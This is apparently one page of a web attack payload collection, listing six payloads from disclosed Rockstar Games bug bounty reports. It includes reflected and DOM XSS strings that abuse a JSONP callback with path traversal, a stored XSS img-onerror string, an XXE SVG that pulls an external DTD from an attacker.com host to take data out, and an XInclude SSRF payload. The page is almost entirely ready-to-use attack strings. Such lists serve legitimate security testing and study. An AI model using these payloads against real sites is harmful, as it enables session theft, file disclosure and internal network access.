# Rockstar Games

6 payloads.

### `52976fab`

```
http://target.com/newswire/tags#/?tags=\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
```

**Parameter:** `callback`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `5a4874d9`

```
\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
```

**Parameter:** `tags`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `f57baad7`

```
?callback=alert(/xss/);//
```

**Parameter:** `callback`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `7bf2a0a4`

```
†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
```

— [Stored XSS in profile activity feed messages](https://hackerone.com/reports/231444) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,000.0

### `9b94ac19`

```
<!DOCTYPE svg [
<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
%outside;
]>
<svg>
  <defs>
    <pattern id="exploit">
      <text x="10" y="10">
        &exfil;
      </text>
    </pattern>
  </defs>
</svg>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0

### `3c76be40`

```
<text x="10" y="10">
    <xi:include href="https://target.com/" parse="text"/>
</text>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0
